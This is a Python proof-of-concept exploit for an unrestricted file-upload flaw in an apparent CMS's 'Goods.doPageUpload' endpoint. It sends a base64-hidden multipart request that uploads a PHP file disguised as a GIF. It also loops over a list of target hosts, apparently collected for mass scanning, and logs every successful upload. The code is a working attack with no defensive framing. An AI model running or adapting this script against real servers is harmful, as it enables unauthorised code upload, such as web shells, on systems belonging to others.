import base64,requests,time,re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

#CMS框架的文件上传
def upload(pocurl):
    poc_path = '/wxapp.php?controller=Goods.doPageUpload'
    target_url = pocurl + poc_path                  #合并URL
    heanding = {
            'Cache-Control' : 'max-age=0',
            'Upgrade-Insecure-Requests' : '1',
            'Content-Type' : 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs',
            'Origin' : 'null',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding' : 'gzip,deflate',
            'Accept-Language' : 'zh-CN,zh;q=0.9',
    }
    payload = '''
Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeThVYUFObVdBZ000QnFCU3MKQ29udGVudC1EaXNwb3Np
dGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGZpbGUiOyBmaWxlbmFtZT0iVGVzdC5waHAiCkNvbnRl
bnQtVHlwZTogaW1hZ2UvZ2lmCgo8P3BocCBlY2hvKCdUZXN0Jyk7Pz4KLS0tLS0tV2ViS2l0Rm9y
bUJvdW5kYXJ5OFVhQU5tV0FnTTRCcUJTcy0tCgk=
    '''
    print("-"*60)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=target_url, headers=heanding,data=base64.decodebytes(payload.encode('utf-8')).decode(), verify=False, timeout=10)         #请求
        match = re.search(r'"image_o" : "(.*?)",',response.text,re.I|re.M)
        s = match[1]
        s = s.replace('/','')
        print('正在测试: ', target_url)
        print('上传成功，请访问：'+s)
        with open(r'upload.txt','a+') as p:
            p.write(s + '\n')
    except Exception as e:
        print("输入有误！",e)
    print("-"*60)

# def more_upload(file):
#     file = open(file,'r')
#     for i in file.readlines():
#         i = i.strip()
#         upload(i)
#         print("n")
if __name__ == '__main__':
    with open('E:/pythonProject/fofa_poc/ip.txt','r') as u:
        upload_pocs = u.readlines()
        for upload_poc in upload_pocs:
            upload(upload_poc)